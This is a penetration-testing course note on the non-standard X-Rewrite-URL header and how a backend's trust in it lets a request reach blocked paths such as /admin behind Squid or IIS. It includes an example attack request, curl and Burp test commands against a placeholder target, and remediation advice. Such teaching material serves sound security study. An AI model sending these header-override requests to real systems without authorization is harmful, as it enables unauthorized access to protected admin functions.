---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.07 X-Rewrite-URL — URL Override"
---

# 03.07 — X-Rewrite-URL

## What is it?

`X-Rewrite-URL` is a non-standard header used by Squid proxy and some Microsoft IIS/ASP.NET setups to pass the original requested URL to the backend after URL rewriting. Like `X-Original-URL`, it can be abused to override the path seen by the backend.

---

## Attack: URL Override

```
Squid proxy rewrites URLs before forwarding to backend.
Backend trusts X-Rewrite-URL to know the "real" path.

ATTACK:
  GET / HTTP/1.1
  Host: target.com
  X-Rewrite-URL: /admin/users

  Proxy: sees GET / → allows (not blocked)
  Backend: reads X-Rewrite-URL → serves /admin/users!

IIS/ASP.NET via URL rewriting module:
  Some IIS URL Rewrite rules preserve original URL in this header.
  If ASP.NET reads it to determine routing, attacker controls routing.
```

---

## Testing

```bash
# Basic URL override test
curl -H "X-Rewrite-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /api/internal/users" https://target.com/

# Combine with X-Original-URL
curl -H "X-Original-URL: /admin" \
     -H "X-Rewrite-URL: /admin" https://target.com/

# Burp Suite:
# Send any allowed request → Repeater
# Add X-Rewrite-URL: /admin
# Check if response changes
```

---

## Difference from X-Original-URL

```
X-Original-URL: Used by Nginx, Drupal, some frameworks
X-Rewrite-URL:  Used by Squid, IIS URL Rewrite module

Both have the same attack pattern — try both!
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Backend routes based on X-Rewrite-URL | Strip this header at the proxy before forwarding |
| Access control only at proxy | Add backend-level authorization checks |

---

## Related Notes
- [[06 - X-Original-URL]] — same attack, different proxy
- [[01 - Host Header]] — other header-based bypass
- [[Module 03 - Access Control]] — access control bypass patterns
